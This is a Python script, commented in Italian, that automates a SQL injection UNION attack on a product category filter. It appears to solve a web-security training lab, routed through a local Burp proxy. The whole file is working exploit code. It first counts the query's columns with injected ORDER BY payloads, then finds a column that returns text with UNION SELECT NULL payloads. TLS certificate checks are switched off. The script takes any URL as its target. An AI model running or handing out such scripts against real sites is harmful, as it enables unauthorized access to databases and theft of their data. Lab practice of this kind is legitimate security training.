import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { "http" : "http://127.0.0.1:8080", "https" : "http://127.0.0.1:8080"}


def exploit_sqli_columns(url):
    uri = "/filter?category=Gifts"
    # FOR LOOP DA 1 A 50 ==> ' ORDER BY 1-- FINO A ' ORDER BY 50--
    for i in range(1,50):
        sql_payload = "'+ORDER+BY+%s--" %i
        # CREA LA RICHIESTA GET
        r = requests.get(url + uri + sql_payload, verify=False, proxies=proxies)
        # MEMORIZZA NELLA VARIABILE IL TESTO DELLA RISPOSTA
        response = r.text
        # SE NEL TESTO DELLA RISPOSTA COMPARE LA STRINGA "Internal Server Error" SIGNIFICA CHE NON ESISTONO i COLONNE MA SOLO i-1
        if "Internal Server Error" in response:
            return i -1
        i = i + 1
    return False

def exploit_sqli_string_field(url,num_cols):
    uri = "/filter?category=Gifts"
    # FOR LOOP DA 1 A NUMERO DI COLONNE +1
    for i in range(1,num_cols+1):
        string = "'Oscz3Z'"
        # PREPARAZIONE DI UNA LISTA PAYLOAD CON NUMERO DI NULL PARI AL NUMERO DI COLONNE
        payload_list = ['NULL'] * num_cols
        # ULTIMO ELEMENTO DELLA LISTA HA PER VALORE LA STRINGA SPECIFICATA SOPRA
        payload_list[i-1] = string
        # CREAZIONE DEL PAYLOAD PER UNION ATTACK
        sql_payload = "' UNION SELECT " + ','.join(payload_list) + "--"
        r = requests.get(url + uri + sql_payload, verify=False, proxies=proxies)
        response = r.text
        if string.strip('\'') in response:
            return i
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s 'www.example.com'" % sys.argv[0])
        sys.exit()

    print("[+] Testando il numero di colonne...")
    num_cols = exploit_sqli_columns(url)
    if num_cols:
        print("[+] Il numero di colonne è " + str(num_cols) + ".")
        print("[+] Testando quale colonna può contenere del testo...")
        string_column = exploit_sqli_string_field(url,num_cols)
        if string_column:
            print("[+] La colonna che può contenere del testo è " + str(string_column) + ".")
        else:
            print("[-] Nessuna colonna può contenere del testo.")
    else:
        print("[-] SQL Injection fallita")